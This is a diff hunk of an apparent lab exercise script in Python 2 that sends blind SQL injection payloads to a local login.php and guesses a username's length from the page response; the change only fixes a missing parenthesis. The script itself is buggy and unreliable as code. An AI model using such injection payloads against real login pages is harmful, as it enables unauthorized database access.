@@ -19,7 +19,7 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 for x in xrange(0,25):
 	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(username)%20=%20" + x + "--%20"
 	response = f.read()
-	if (response.find('cat.JPG')!=-1: 
+	if (response.find('cat.JPG')!=-1): 
 		print "found size : %s" %x
 
 f = urllib.urlopen(request)
